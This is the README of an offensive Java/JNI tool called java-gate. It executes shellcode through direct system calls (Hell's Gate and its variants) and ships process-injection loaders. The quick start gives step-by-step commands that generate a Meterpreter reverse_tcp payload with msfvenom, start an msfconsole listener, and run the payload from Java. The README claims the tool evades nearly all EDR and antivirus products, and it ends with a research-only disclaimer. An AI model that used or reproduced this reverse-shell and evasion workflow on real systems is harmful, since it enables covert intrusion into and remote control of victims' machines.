# java-gate

![](https://img.shields.io/badge/build-passing-brightgreen)
![](https://img.shields.io/github/downloads/4ra1n/java-gate/total)
![](https://img.shields.io/github/v/release/4ra1n/java-gate)

[中文文档](doc/README.zh-CN.md)

The `java-gate` project allows for the implementation of various techniques related to "Hell's Gate" using simple Java code, which involves direct system calls.

```java
byte[] shellcode = new byte[] {(byte)0xfc, (byte)0x48, ...};
HellsGate gate = new HellsGate(shellcode);
gate.exec();
```

Furthermore, it supports various techniques derived from "Hell's Gate," such as "Halo's Gate," "Recycled Gate," and "Tartarus Gate," among others. In addition to system call-related functionalities, it is compiled and built using C and NASM/MASM assembly, and invoked at the Java layer through JNI. The project also provides many common methods for injecting shellcode, such as APC injection and remote thread injection. All these low-level techniques can be achieved using simple Java code.

## Introduction

Why named "java-gate": This project mainly integrates various techniques related to direct system calls, such as Hell's Gate and Halo's Gate. Therefore, it is named "Java Gate," which can also be understood as a gateway between Java and the underlying system.

Note:

- This project only supports 64-bit Windows and 64-bit JVM (as per JNI's requirement that a 64-bit JVM can only load 64-bit DLLs).
- It is recommended to use 64-bit shellcode (e.g., windows/x64/meterpreter/reverse_tcp).
- Loading shellcode in any way may potentially cause JVM crashes (e.g., if the shellcode does not restore the context).

## Quick Start

(1) Add the `jitpack` repository to your `Maven` configuration:

```xml
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
```

(2) Import the project:

```xml
<dependency>
    <groupId>com.github.4ra1n</groupId>
    <artifactId>java-gate</artifactId>
    <version>0.0.1</version>
</dependency>
```

(3) Obtain the shellcode

Here, we'll use `meterpreter` as an example.

```shell
msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR-IP LPORT=YOUR-PORT -f java
```

(4) Start the `msfconsole` listener

Here, we'll use `meterpreter` as an example.

```shell
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 0.0.0.0;set LPORT YOUR-PORT;run;"
```

(5) Write a test program

```java
package me.n1ar4;

import me.n1ar4.gate.core.HellsGate;

public class Main {
    public static void main(String[] args) {
        byte buf[] = new byte[]
                {
                        (byte) 0xfc, (byte) 0x48, ...
                };
        HellsGate gate = new HellsGate(buf);
        gate.exec();
    }
}
```

(6) Go online

The `msfconsole` connection is successfully established.

The system call modules are as follows. Usage is similar to the previous examples, just change the class name.

| Module        | Class                           | Description   | Optional |
|:--------------|:--------------------------------|:--------------|:---------|
| hells-gate    | me.n1ar4.gate.core.HellsGate    | Hells Gate    | /        |
| halos-gate    | me.n1ar4.gate.core.HalosGate    | Halos Gate    | /        |
| recycled-gate | me.n1ar4.gate.core.RecycledGate | Recycled Gate | /        |
| ssn-syscall   | me.n1ar4.gate.core.SSNSyscall   | SSN Syscall   | /        |
| tartarus-gate | me.n1ar4.gate.core.TartarusGate | Tartarus Gate | /        |

The loader modules are as follows. Usage is similar to the previous examples, just change the class name.

| Module     | Class                                | Description                                              | Optional     |
|:-----------|:-------------------------------------|:---------------------------------------------------------|:-------------|
| apc1       | me.n1ar4.gate.loader.APC1Loader      | APC injection using NtTestAlert                          | /            |
| apc2       | me.n1ar4.gate.loader.APC2Loader      | Simple thread-based APC injection                        | /            |
| crt        | me.n1ar4.gate.loader.CRTLoader       | Simple remote thread injection                           | Process name |
| divide     | me.n1ar4.gate.loader.DivideLoader    | Create process and inject into it                        | /            |
| early-bird | me.n1ar4.gate.loader.EarlyBirdLoader | Create new process and APC inject                        | /            |
| etwp       | me.n1ar4.gate.loader.EtwpLoader      | EtwpCreateEtwThread-based injection                      | /            |
| rip        | me.n1ar4.gate.loader.RIPLoader       | Modify thread context RIP register and execute shellcode | /            |

Here is an example of how to use the command-line tool.

```shell
java -jar java-gate.jar [module] [shellcode-hex-string] [optional]
```

Since the JVM may crash, there is a way to create a new process and execute the code.

```shell
java -jar java-gate.jar run-new-jvm [module] [shellcode-hex-string]
```

This is also an approach, and if you want to run this project in your custom code, you can refer to the code `JavaGate#runNewJVM`.

## Build

There are pre-packaged versions available in the "Release" section, but if you are not confident or need to add your own features, you can manually build it by following these steps:

Please note that this project only supports Windows 64-bit and JVM 64-bit environments, so it can only be compiled and built in that environment.

**(1) MSVC x64**

The `CMake Toolchains` use the `MSVC x64` tool, and most of the assembly is based on the `ml64` compiler from `MSVC`.

**(2) CMake 3.x**

The `C` and assembly code is compiled and built using `CMake` to generate the corresponding `DLL` file for `JNI`. It is recommended to use CLion.

**(3) NASM**

Most of the assembly is compiled using `MASM`, but some assembly is compiled using `NASM`, which needs to be downloaded and configured separately in the `PATH`.

**(4) JDK 8 & Maven**

The `Java` part of the code is built using `Java 8` and `Maven`. It is recommended to use IDEA.

**(5) Python 3.x**

This project uses `Python` for some auxiliary tools, which is not actually a necessary option.

## Some tests

Almost Bypass all EDR/AV

## References and Acknowledgements

Many thanks to the following excellent projects for providing code (most of the code in this project is based on these):

- https://github.com/am0nsec/HellsGate
- https://github.com/boku7/AsmHalosGate
- https://github.com/thefLink/RecycledGate
- https://github.com/trickster0/TartarusGate
- https://github.com/janoglezcampos/c_syscalls

## Disclaimer

This tool is intended for cybersecurity research and educational purposes only. It should not be used for any illegal activities.